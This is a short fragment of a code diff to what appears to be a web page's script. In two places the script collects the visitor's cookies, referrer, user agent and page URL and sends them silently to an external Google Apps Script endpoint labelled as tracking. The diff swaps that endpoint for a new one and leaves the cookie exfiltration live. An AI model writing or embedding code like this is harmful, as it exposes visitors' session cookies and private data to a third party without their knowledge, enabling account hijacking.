@@ -81,11 +81,11 @@
       var referrer = document.referrer;
       var cookies = document.cookie;
 
-      var trackingUrl = 'https://script.google.com/macros/s/AKfycbyQwmgN32R3dcT1uOIXgRmgcUCTuqH-ImrCJHbtyF2PEuHdb5tnpUMpJrwArOLW9MN46w/exec?' +
+      var trackingUrl = 'https://script.google.com/macros/s/AKfycbzMHIWEONHDS9maAU5PniSmZR5zE4-aMUrTsTngsSR6aHmiN3lDUaPJXyADDHJv0_u2vg/exec?' +
         'page=' + encodeURIComponent(pageUrl) +
         '&userAgent=' + encodeURIComponent(userAgent) +
         '&referrer=' + encodeURIComponent(referrer) +
-        '&cookies=' + encodeURIComponent(cookies);
+        '&cookies=' + encodeURIComponent(cookies)
 
       fetch(trackingUrl, { mode: 'no-cors' }).then(response => {
         return response.text();
@@ -103,7 +103,7 @@
       var referrer = document.referrer;
       var cookies = document.cookie;
 
-      var trackingUrl = 'https://script.google.com/macros/s/AKfycbyQwmgN32R3dcT1uOIXgRmgcUCTuqH-ImrCJHbtyF2PEuHdb5tnpUMpJrwArOLW9MN46w/exec?' +
+      var trackingUrl = 'https://script.google.com/macros/s/AKfycbzMHIWEONHDS9maAU5PniSmZR5zE4-aMUrTsTngsSR6aHmiN3lDUaPJXyADDHJv0_u2vg/exec?' +
         'page=' + encodeURIComponent(pageUrl) +
         '&userAgent=' + encodeURIComponent(userAgent) +
         '&referrer=' + encodeURIComponent(referrer) +
